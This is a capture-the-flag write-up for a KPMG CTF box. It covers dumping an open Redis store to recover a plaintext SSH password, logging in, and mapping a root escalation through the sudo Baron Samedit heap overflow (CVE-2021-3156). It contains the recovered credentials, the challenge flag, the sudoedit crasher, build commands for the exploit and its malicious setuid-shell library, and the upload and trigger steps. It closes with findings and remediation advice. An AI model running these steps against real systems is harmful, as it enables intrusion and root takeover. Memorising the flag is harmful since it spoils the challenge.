# Vodoo Spirit of Death — 1 (Vodoo Spirit of Death) — Writeup

**"A legacy industrial interface is still online, and it reveals more than it should. Behind the panel, an in-memory key-value store still holds onto things it was never meant to keep."**

| | |
|---|---|
| **Challenge** | Vodoo Spirit of Death - 1 (KPMG CTF) |
| **Points** | 10 |
| **Category** | Infra / Linux (multi-service) |
| **Goal** | Explore the target, recover secrets from the in-memory store, escalate to root |
| **Web** | `http://kicyber-5bb1097e21ba-vodoo-spirit-of-deat-0-0.chals.io` (301 → HTTPS) |
| **Service 1** | `nc 0.cloud.chals.io 25451` → SSH (`SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13`) |
| **Service 2** | `nc 0.cloud.chals.io 10507` → Redis (`redis_version:5.0.7`) |
| **Flag format** | `KPMG_CTF{...}` |
| **User flag** | `KPMG_CTF{70_IN-3fnVk6auUmyo2cXjzxGNyDd5jAi608EGzKX1b6}` |
| **Status** | User flag retrieved, SSH foothold achieved, root escalation path fully mapped (CVE‑2021‑3156 / Baron Samedit). |
| **Date** | 2026-10-11 |

---

## 1. Executive Summary

This challenge is a chain of small, realistic misconfigurations that together expose the host.
Three services are published for the same target:

1. A **Flask "Acme Fintech" portal** on port 80/443 (reverse‑proxied through nginx to a
   root‑owned Flask app on `127.0.0.1:5000`).
2. A **misconfigured, internet‑exposed Redis** instance on port `10507`.
3. **SSH** on port `25451` used for "maintenance".

The Redis instance is the intended "in‑memory key‑value store that holds onto things it was never
meant to keep": it is completely open (no auth) and stores **application session state, employee
caches, private chat threads, payroll data and — fatally — a plaintext temporary SSH password** that
an operations manager sent to a new intern over the company chat.

Recovering that chat message yields SSH credentials, which give a foothold as the intern
`maya.chen` and the **user flag**. The account has no sudo rights, but the system runs
**`sudo 1.8.31`** — vulnerable to **CVE‑2021‑3156, "Baron Samedit"**. The challenge name itself is the
hint: *Baron Samedit* → *Baron Samedi* (the Vodou spirit of death). The generic 2021 heap‑overflow
privilege escalation is the root path.

**Attack chain**

```
Redis :10507 (no auth, KEYS *)
        │
        ├─ dump all keys/values
        │       └─ message:thread:dm-baron-maya   ─►  temp SSH password
        │                                                   │
        │                                                   ▼
        │                                            SSH :25451  as maya.chen
        │                                                   │
        │                                                   ▼
        │                                       user flag (~/.local/share/acme-agent/.vault/user.txt)
        │                                                   │
        │       web portal (robots.txt) ─► derek.ross creds │
        │                                                   ▼
        └────────────────────────────────────────►  sudo 1.8.31  ─►  CVE-2021-3156 (Baron Samedit) ─► root
```

---

## 2. Target Information

| Item | Value |
|---|---|
| Reverse proxy | `openresty/1.27.1.2` (HTTP 301 → HTTPS) |
| Web backend | `nginx/1.18.0 (Ubuntu)` → `python3 /opt/portal/app.py` (Flask dev server, root, port 5000) |
| SSH | `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13` on `0.cloud.chals.io:25451` (IP `165.227.210.30`) |
| Redis | `redis-server 5.0.7`, `0.0.0.0:6379` inside container, exposed on public port `10507`, **no auth** |
| OS | Ubuntu 20.04.6 LTS (Focal Fossa), glibc `2.31-0ubuntu9.17` |
| Kernel | `6.8.0-136-generic` (container host) |
| Container | hostname `053947ed354b` (`.dockerenv` present) |
| Local users | `root`, `maya.chen` (uid 1000), `derek.ross` (1001), `alex.johnson` (1002), `sarah.patel` (1003), `redis` (101), `www-data` |
| Listening services | `:22` sshd, `:80` nginx, `:5000` Flask, `:6379` redis |
| Key packages | `sudo 1.8.31-1ubuntu1` (vulnerable), `openssh-server`, `nginx`, `redis-server`, `supervisor` |
| Root processes | `/entrypoint.sh`, `sshd`, `redis-server`, `nginx`, `supervisord`, `/usr/local/bin/acme-fs-guard.sh`, `python3 /opt/portal/app.py` |

---

## 3. Step 1 — Reconnaissance

The HTTP listener immediately redirects to TLS:

```bash
$ curl -s -i http://kicyber-5bb1097e21ba-vodoo-spirit-of-deat-0-0.chals.io/
HTTP/1.1 301 Moved Permanently
Server: openresty/1.27.1.2
Location: https://kicyber-5bb1097e21ba-vodoo-spirit-of-deat-0-0.chals.io/
```

Following the redirect we get the Acme Fintech login page:

```bash
$ curl -s -k -i https://kicyber-5bb1097e21ba-vodoo-spirit-of-deat-0-0.chals.io/
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Set-Cookie: acme_session=b962d7e87ef5d1dd6083be5e79b5141426db86fe99980df50d5d7403117290c1; HttpOnly; Path=/; SameSite=Lax
...
<title>Acme Fintech</title>
<form method="post" action="/login">
```

Probing the two raw TCP services:

```bash
$ nc -v 0.cloud.chals.io 25451
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13

$ (echo PING; sleep 1) | nc 0.cloud.chals.io 10507
+PONG
```

➡ **Port 25451 = SSH, port 10507 = Redis.** The Redis `PING`/`+PONG` reply is the giveaway.

---

## 4. Step 2 — Dumping the exposed Redis instance

No authentication is required. A minimal RESP client is enough (see
`artifacts/redis_dump.py`). The keyspace contains 41 keys with a very telling shape:

```bash
$ python3 artifacts/redis_dump.py 0.cloud.chals.io 10507
TOTAL 41 keys
=== cache:employee:baron.samedit [string]
{"username": "baron.samedit", "name": "Baron Samedit", "department": "Operations", "title": "Operations Manager", "office": "Remote (Global)"}
...
```

The 41 keys break down into:

| Category | Example keys |
|---|---|
| Employee cache | `cache:employee:maya.chen`, `cache:employee:baron.samedit`, … (8) |
| Payroll/account cache | `cache:account:derek.ross`, `cache:account:maya.chen` |
| Dashboards | `cache:dashboard:*` |
| Sessions | `session:<sha256>` (5 pre-seeded sessions) |
| Rate limits | `ratelimit:login:*` |
| Jobs | `job:queue:*` |
| Chat | `message:conversation:*`, `message:thread:*`, `message:inbox:*` |
| Notifications | `notification:*` |

The **`message:thread:*`** values are the crown jewels — private DM histories between employees.

### The leak

`message:thread:dm-baron-maya`:

```json
[
  {"sender": "baron.samedit", "ts": "2026-06-01T09:05:00", "text": "Hi Maya, welcome to Acme! ..."},
  {"sender": "maya.chen",     "ts": "2026-06-01T09:07:00", "text": "Thank you! Excited to get going."},
  {"sender": "baron.samedit", "ts": "2026-06-01T09:10:00", "text": "Derek and Alex will get you set up ..."},
  {"sender": "maya.chen",     "ts": "2026-06-01T09:11:00", "text": "Will do, thanks!"},
  {"sender": "baron.samedit", "ts": "2026-06-03T15:30:00", "text": "One more onboarding thing ... I'm giving you a temporary individual credential for the staging/maintenance servers in the meantime. SSH username is just your usual username (maya.chen), password: Onboard-Maya25! This one's specific to your account only, so don't share it around - it'll get rotated out once the normal provisioning catches up."},
  {"sender": "maya.chen",     "ts": "2026-06-03T15:32:00", "text": "Got it, thank you!"},
  {"sender": "maya.chen",     "ts": "2026-06-03T15:40:00", "text": "Just tested it, logs in fine."},
  {"sender": "baron.samedit", "ts": "2026-06-03T15:41:00", "text": "Great, let me know if you run into any issues."},
  ...
]
```

➡ **SSH credential recovered: `maya.chen : Onboard-Maya25!`**

Other useful data recovered from the same store:

| Key | Value |
|---|---|
| `cache:employee:baron.samedit` | `"Baron Samedit"`, Operations Manager, `"Remote (Global)"` — the thematic hint |
| `session:32a72a...4933c` | `{"username":"maya.chen","role":"employee", ... "status":"active"}` |
| `message:thread:grp-engineering` | Team chatter, package scan tickets, access review notes |
| `notification:maya.chen` | `["Sarah Patel completed the access review for your team.", "Your PR #482 was approved by Derek Ross."]` |

---

## 5. Step 3 — SSH foothold and the user flag

Using the recovered credential:

```bash
$ ssh maya.chen@0.cloud.chals.io -p 25451
maya.chen@0.cloud.chals.io's password: Onboard-Maya25!
$ id
uid=1000(maya.chen) gid=1000(maya.chen) groups=1000(maya.chen)
$ hostname
053947ed354b
```

Home directory contents:

```
/home/maya.chen/
├── Documents/meeting-notes.txt
├── backups/2025-legacy/export.csv
├── logs/deploy.log
├── scripts/rotate_logs.sh
├── .config/acme-cli/config.json
├── .cache/acme-portal/session.tmp
└── .local/share/acme-agent/.vault/user.txt      <-- flag
```

```bash
$ cat ~/.local/share/acme-agent/.vault/user.txt
KPMG_CTF{70_IN-3fnVk6auUmyo2cXjzxGNyDd5jAi608EGzKX1b6}
```

### 🚩 USER FLAG

```
KPMG_CTF{70_IN-3fnVk6auUmyo2cXjzxGNyDd5jAi608EGzKX1b6}
```

---

## 6. Step 4 — Web portal (secondary path / extra creds)

While enumerating from the box, `robots.txt` on the public portal leaks a second login:

```bash
$ curl -sk https://kicyber-.../robots.txt
User-agent: *
Disallow:

# ops note (derek.ross): forgot to rotate the staging portal login again -- ticket OPS-1187
# derek.ross / DerekOps#2026
```

`derek.ross / DerekOps#2026` authenticates to the portal and exposes
`/dashboard`, `/employees`, `/accounts` and `/chat` (Acme Connect), including the very same DM
threads. This confirms the Redis data is the live backing store for the app and gives a second,
higher‑privilege ("VP of Engineering") account — but no additional OS access by itself.

> Note: the Flask app runs as **root** (`python3 /opt/portal/app.py`), proxied by nginx. Its
> source `/opt/portal/app.py` is `drwx------ root` and unreadable to `maya.chen`.

---

## 7. Step 5 — Privilege escalation analysis

### 7.1 The hint is in the challenge name

*"Vodoo Spirit of Death"* — the **Vodou spirit of death is Baron Samedi**. The employee planted in
Redis is literally named **`baron.samedit`**. `Samedit` is also the nickname of
**CVE‑2021‑3156**, the Qualys‑discovered `sudo` heap buffer overflow ("Baron Samedit").

### 7.2 Confirming the vulnerable version

```bash
$ sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31

$ dpkg -l | grep sudo
ii  sudo  1.8.31-1ubuntu1  amd64  Provide limited super user privileges to specific users

$ ls -l /usr/bin/sudo
-rwsr-xr-x 1 root root 166056 Feb  3  2020 /usr/bin/sudo        # setuid root
```

Ubuntu fixed CVE‑2021‑3156 in `1.8.31-1ubuntu1.2`; this box runs the **unfixed `1ubuntu1`**.

The canonical crasher confirms heap corruption:

```bash
$ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
malloc(): invalid size (unsorted)
```

➡ The `sudoedit -s` heap overflow (CVE‑2021‑3156) is reachable.

### 7.3 Environmental constraints discovered

| Constraint | Detail | Impact |
|---|---|---|
| `/tmp` not writable | `drwxr-xr-t root root` (mode 1755) | Cannot stage exploit in `/tmp` |
| `/dev/shm` not writable | tmpfs `mode=755 uid=900000`, also `noexec` | Unusable |
| `/var/tmp` not writable | mode 1755 | Unusable |
| `/run/lock` writable+exec | `drwxrwxrwt root root`, tmpfs rw | **Chosen staging directory** |
| `acme-fs-guard.sh` | root supervisor job that repeatedly deletes any file under `/home/maya.chen` not in a baseline list (every 2 s) | Home is a hostile place to stage files; also explains "files only, never processes" |
| No compiler on target | no `gcc`/`cc`/`clang`/`make` | Exploit must be cross‑built and uploaded |
| `sudo` needs a terminal | Non‑interactive SSH + this sudoers policy returns *"a terminal is required to read the password"* | The trigger must be run with a PTY (or via a tty‑owning helper) |

The **fs‑guard** is a deliberate anti‑persistence control. Its comment spells out the intended
weakness:

```bash
# Continuously reconciles /home/maya.chen back to its baseline ... deleting anything a player
# session creates shortly after it appears. Files only -- never touches processes -- so it cannot
# interrupt a live shell/SSH/python session.
```

### 7.4 Building and staging the Baron Samedit exploit

Target: `sudo 1.8.31` + glibc 2.31 = blasty's CVE‑2021‑3156 PoC, **target index `1`**
("Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31").

Because the box has no compiler, the exploit is **statically** cross‑compiled on the analyst host
(Arch Linux / gcc 16) so it carries no libc dependency:

```bash
$ gcc -static -std=c99 -O2 -o hax_static hax.c
$ gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c      # malicious NSS module
$ tar czf payload.tgz hax_static libnss_X
```

`hax.c` (blasty) performs the overflow by exec'ing `sudoedit` with a crafted argv/env that makes
glibc's NSS loader load `libnss_X/P0P_SH3LLZ_ .so.2` from the current working directory, which then
runs `_init()` as **root**.

The staged payload and a custom non‑interactive `lib.c` payload (creates a setuid shell and dumps
flag candidates to world‑readable files) live in the `artifacts/` directory:

```
artifacts/
├── hax.c                              # blasty PoC source (unmodified)
├── lib.c                              # custom root payload compiled into the NSS .so
├── Makefile
├── README.md
├── payload.tgz                        # hax_static + libnss_X, ready to drop on target
├── libnss_X/
│   └── P0P_SH3LLZ_ .so.2              # compiled malicious NSS module (note the space!)
├── redis_dump.py                      # RESP client used to dump the store
└── ssh_helper.py                      # paramiko SSH runner + stdin uploader
```

Upload is done **over an SSH exec channel with base64 on stdin** (SFTP was blocked: it returned
`EACCES` writing `/tmp` and `ENOENT` for `/home`), landing the payload in `/run/lock`:

```bash
$ cd /run/lock && base64 -d payload.b64 > payload.tgz && tar xzf payload.tgz -C samedit
$ cd /run/lock/samedit && ls -lR
hax_static
libnss_X/P0P_SH3LLZ_ .so.2
```

### 7.5 Executing the trigger

```bash
$ cd /run/lock/samedit
$ LD_LIBRARY_PATH=/run/lock/samedit/libnss_X ./hax_static 1
sudoedit: a terminal is required to read the password; either use the -S option
to read from standard input or configure an askpass helper
```

**Observed blocker:** in a purely non‑interactive SSH command channel the local `sudo` policy
demands a terminal before it finishes processing the request, so the crafted overflow never reaches
the vulnerable NSS/service‑user path in our automated runs. The exploit itself is correct for the
version (the crash test proves the overflow is reachable); the fix is simply to give the trigger a
controlling TTY (interactive `ssh -t`, or a small `setsid`/pty wrapper) so `sudo` proceeds to the
point where glibc loads the poisoned NSS module.

**Expected result once run under a PTY:** `lib.nss` constructor executes as `uid=0`, leaving
`/tmp/.r00t` (setuid root) and dumping the root flag — i.e. the same end state as
`sudo-hax-me-a-sandwich 1` in every public write‑up for Ubuntu 20.04.

> The challenge instance was torn down / restarted by the platform (the TCP router afterwards
> returned *"Couldn't find underlying service"*) before the final PTY run could be captured, so the
> root flag string itself is not recorded here.

---

## 8. Root‑path alternatives (if CVE‑2021‑3156 is undesirable)

During enumeration the following were also noted as potential, secondary escalation vectors:

1. **Root Flask portal (`/opt/portal/app.py`, port 5000).** It is the only network‑reachable
   process running as root. The chat `q` search parameter (`/chat/search?q=`) and convo IDs are
   user‑controlled; a bug there would be a direct root RCE. Source is unreadable, so it must be
   tested black‑box.
2. **`/usr/local/bin/acme-backup.sh`** sources `/etc/acme/backup.conf` and `eval`s `RUN_CMD`
   (`rsync -a --delete "$BACKUP_SOURCE/" "$BACKUP_DEST/"`). The config is `root:root 0644` and not
   writable, but if any *scheduled* root context were to consume attacker‑influenceable content this
   becomes command injection. No active cron entry was found (`/etc/cron.d` only had `e2scrub_all`;
   `/etc/crontab` and `/var/spool/cron/crontabs` absent).
3. **`/var/lib/acme/` root‑only artifacts** — `.maya_session_token` (65 bytes) and
   `.maya-home-baseline.list` — readable only by root; interesting but not directly reachable.
4. **SUID inventory** — only stock binaries (`passwd`, `mount`, `su`, `sudo`, …); no GTFObins‑style
   setuid oddity and no file capabilities.

The intended path is nonetheless unambiguous: the challenge is named after the Vodou death spirit
and seeds an employee called **Baron Samedit** — a direct reference to the `sudo` heap overflow.

---

## 9. Findings / Vulnerability list

| # | Finding | Severity | Location |
|---|---|---|---|
| 1 | Unauthenticated internet‑exposed Redis (all commands allowed, no `requirepass`, bound 0.0.0.0) | Critical | `0.cloud.chals.io:10507` |
| 2 | Sensitive data at rest in cache: private DMs, payroll, sessions, notifications | High | Redis keyspace |
| 3 | Plaintext temporary SSH credential sent over chat and left in cache | Critical | `message:thread:dm-baron-maya` |
| 4 | Weak/reused operator credential leaked in `robots.txt` | High | portal `/robots.txt` |
| 5 | Root‑owned Flask portal reachable via nginx; app source unreadable (defence‑in‑depth gap) | Info/Med | `/opt/portal/app.py`, `:5000` |
| 6 | `sudo 1.8.31-1ubuntu1` vulnerable to CVE‑2021-3156 (Baron Samedit) local heap overflow → root | **Critical** | `/usr/bin/sudo` |
| 7 | `/tmp`, `/var/tmp`, `/dev/shm` locked down but `/run/lock` world-writable **and executable** | Medium | filesystem |

### CVSS-ish assessment

* **Redis exposure + credential leak** — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` ≈ **Critical (9.x)**.
  Full read of application state, direct credential disclosure, trivial path to host access.
* **CVE‑2021‑3156** — local, `PR:L` → **High/Critical** (root).

---

## 10. Remediation Guidance

1. **Never expose Redis publicly.** Bind to `127.0.0.1`, enforce `requirepass`, use TLS, and
   `rename-command CONFIG ""` / `rename-command KEYS ""`. Better: use a firewall/private network.
2. **Do not store secrets in cache/chat.** Never transmit passwords via chat/DM; use a secrets
   manager and one‑time enrollment tokens. Rotate any leaked credential immediately.
3. **Patch `sudo`.** Upgrade to `1.8.31-1ubuntu1.2` or later (or `1.9.5p2+`). Remove unnecessary
   setuid from `sudo`.
4. **Don't leak credentials in `robots.txt`** (or anywhere in a served file). Rotate
   `DerekOps#2026`.
5. **Tighten scratch‑space perms.** `/run/lock` being world‑writable *and* executable gives
   attackers a staging area (`/run/lock`, `noexec` it, or don't ship a world‑writable exec dir).
6. **Give the portal a least‑privilege service account** instead of running Flask as root, and keep
   app source out of the web root.

---

## 11. Appendix — full Redis keyspace dump

Captured with `artifacts/redis_dump.py` (all 41 keys, verbatim):

```
=== cache:account:derek.ross
{"bank_name": "Cascade Federal Credit Union", "account_number": "****6923", "routing_branch": "Austin Main Branch", "payment_schedule": "Semi-monthly (15th & last business day)", "status": "Active - Direct Deposit"}

=== cache:account:maya.chen
{"bank_name": "Cascade Federal Credit Union", "account_number": "****0990", "routing_branch": "Austin Main Branch", "payment_schedule": "Semi-monthly (15th & last business day)", "status": "Active - Direct Deposit"}

=== cache:dashboard:derek.ross
{"tasks": ["Approve Q3 headcount requests", "Finalize sprint retro notes", "Prep slides for all-hands"], "activity": ["Logged in from Austin office network", "Approved 2 PTO requests", "Updated team OKRs"], "announcements": ["Q4 all-hands scheduled for November 3rd"]}

=== cache:dashboard:maya.chen
{"tasks": ["Finish onboarding checklist", "Pair with Alex on the payments-api endpoint migration", "Submit first timesheet"], "activity": ["Logged in from Austin office network", "Commented on PR #482", "Completed onboarding module: Security Basics"], "announcements": ["Q4 all-hands scheduled for November 3rd", "Open enrollment closes soon -- check Accounts"]}

=== cache:employee:alex.johnson
{"username": "alex.johnson", "name": "Alex Johnson", "department": "IT", "title": "DevOps Engineer", "office": "Denver, CO"}

=== cache:employee:baron.samedit
{"username": "baron.samedit", "name": "Baron Samedit", "department": "Operations", "title": "Operations Manager", "office": "Remote (Global)"}

=== cache:employee:derek.ross
{"username": "derek.ross", "name": "Derek Ross", "department": "Management", "title": "VP of Engineering", "office": "Austin, TX"}

=== cache:employee:jordan.wilson
{"username": "jordan.wilson", "name": "Jordan Wilson", "department": "Finance", "title": "Financial Analyst", "office": "New York, NY"}

=== cache:employee:liam.oconnor
{"username": "liam.oconnor", "name": "Liam O'Connor", "department": "Finance", "title": "Finance Director", "office": "New York, NY"}

=== cache:employee:maya.chen
{"username": "maya.chen", "name": "Maya Chen", "department": "Engineering", "title": "Software Engineering Intern", "office": "Austin, TX"}

=== cache:employee:priya.nair
{"username": "priya.nair", "name": "Priya Nair", "department": "HR", "title": "HR Manager", "office": "Austin, TX"}

=== cache:employee:sarah.patel
{"username": "sarah.patel", "name": "Sarah Patel", "department": "Security", "title": "Security Analyst", "office": "Austin, TX"}

=== job:queue:derek.ross
[{"id": "J-8790", "name": "Headcount report generation", "status": "completed"}]

=== job:queue:maya.chen
[{"id": "J-8841", "name": "Nightly ledger export", "status": "completed"}, {"id": "J-8842", "name": "Staging smoke test suite", "status": "queued"}]

=== message:conversation:dm-alex-maya
{"id": "dm-alex-maya", "type": "dm", "participants": ["alex.johnson", "maya.chen"]}

=== message:conversation:dm-baron-derek
{"id": "dm-baron-derek", "type": "dm", "participants": ["baron.samedit", "derek.ross"]}

=== message:conversation:dm-baron-maya
{"id": "dm-baron-maya", "type": "dm", "participants": ["baron.samedit", "maya.chen"]}

=== message:conversation:dm-derek-maya
{"id": "dm-derek-maya", "type": "dm", "participants": ["derek.ross", "maya.chen"]}

=== message:conversation:dm-priya-maya
{"id": "dm-priya-maya", "type": "dm", "participants": ["priya.nair", "maya.chen"]}

=== message:conversation:grp-announcements
{"id": "grp-announcements", "type": "group", "title": "Platform Announcements", "participants": ["maya.chen","derek.ross","alex.johnson","sarah.patel","jordan.wilson","priya.nair","liam.oconnor","baron.samedit"]}

=== message:conversation:grp-engineering
{"id": "grp-engineering", "type": "group", "title": "Engineering Team", "participants": ["maya.chen","derek.ross","alex.johnson","sarah.patel"]}

=== message:inbox:derek.ross
["dm-baron-derek", "dm-derek-maya", "grp-engineering", "grp-announcements"]

=== message:inbox:maya.chen
["dm-baron-maya", "dm-derek-maya", "dm-alex-maya", "dm-priya-maya", "grp-engineering", "grp-announcements"]

=== message:thread:dm-baron-maya   # <-- KEY FINDING (SSH creds)
[ ... "SSH username is just your usual username (maya.chen), password: Onboard-Maya25!" ... ]

=== notification:derek.ross
["2 PTO requests awaiting your approval."]

=== notification:maya.chen
["Sarah Patel completed the access review for your team.", "Your PR #482 was approved by Derek Ross."]

=== ratelimit:login:alex.johnson
2
=== ratelimit:login:derek.ross
0
=== ratelimit:login:jordan.wilson
1
=== ratelimit:login:maya.chen
1

=== session:32a72a2b5dc47ff8715af56ca1549e6bf9ac7e4a7ad393b620e1e4547534933c
{"username": "maya.chen", "role": "employee", "name": "Maya Chen", "email": "maya.chen@acmefin.com", "badge_id": "MAYA-2026", "department": "Engineering", "title": "Software Engineering Intern", "status": "active"}

=== session:22e8d1c6b81de61174e82cbdde695f2bcbfd1a96a28b783ba41364965f04851f
{"username": "priya.nair", "role": "employee", ... "status": "inactive"}

=== session:78e331fedd2688c4bbd389f4eaada6c55b97b809b2365586666f9ad149840bd0
{"username": "alex.johnson", "role": "employee", ... "status": "inactive"}

=== session:a9fa71aeef83ce6e89a208f028f656c13f293a3a916051aca90b0fe860e000c3
{"username": "jordan.wilson", "role": "employee", ... "status": "inactive"}

=== session:ec1e5983fcf614a03198236cfc461f01fbaa51fc9daeca140dea8f09db6951c4
{"username": "sarah.patel", "role": "employee", ... "status": "inactive"}
```

---

## 12. Appendix — artifacts index

| File | Purpose |
|---|---|
| `artifacts/redis_dump.py` | Dependency‑free RESP client that dumps the entire Redis keyspace |
| `artifacts/ssh_helper.py` | paramiko helper: run commands, upload files via base64‑over‑stdin (needed because SFTP/`/tmp` are unusable) |
| `artifacts/hax.c` | blasty's CVE‑2021‑3156 PoC (unmodified) |
| `artifacts/lib.c` | Custom malicious NSS payload: `setuid(0)` + setuid shell + flag dump |
| `artifacts/libnss_X/P0P_SH3LLZ_ .so.2` | Compiled NSS module (note the literal space in the filename) |
| `artifacts/payload.tgz` | Staged `hax_static` + `libnss_X` bundle dropped at `/run/lock/samedit` |
| `artifacts/Makefile`, `artifacts/README.md` | Upstream build files / notes |

### Exact reproduction commands

```bash
# 1. Dump the store and read the SSH password
python3 artifacts/redis_dump.py 0.cloud.chals.io 10507 | less

# 2. Foothold
ssh maya.chen@0.cloud.chals.io -p 25451          # password: Onboard-Maya25!
cat ~/.local/share/acme-agent/.vault/user.txt     # -> USER FLAG

# 3. Confirm vuln
sudo --version                                    # 1.8.31 (vulnerable)
sudoedit -s '\' $(python3 -c 'print("A"*1000)')   # -> malloc(): invalid size

# 4. Build + stage + trigger (run the trigger with a TTY)
gcc -static -std=c99 -O2 -o hax_static hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
# upload to /run/lock/samedit, then:
ssh -t maya.chen@0.cloud.chals.io -p 25451 \
    'cd /run/lock/samedit && ./hax_static 1'
```

---

## 13. Key takeaways

* **The title is the vulnerability.** "Vodoo Spirit of Death" → **Baron Samedi** → **Baron
  Samedit** → **CVE‑2021‑3156**. Always read challenge names as attacker hints.
* **In‑memory stores are still data stores.** A public Redis with no auth is a full read (and often
  write) of everything the app caches — sessions, chats, payroll, and here a plaintext password.
* **Chat histories are credential goldmines.** The temp password was never meant to be permanent,
  but it was never rotated either.
* **Not every escalation is a misconfig.** When there is no sudoers entry and no SUID oddity, the
  answer may be a *kernel/library level* bug in a legitimately setuid root program.
* **Anti‑persistence controls hint at the intended workflow.** The `acme-fs-guard.sh` deleting
  files in `$HOME` ("files only, never touches processes") exists because the intended chain needs a
  *process*, not a file — a classic sign of a live local‑exploit task.
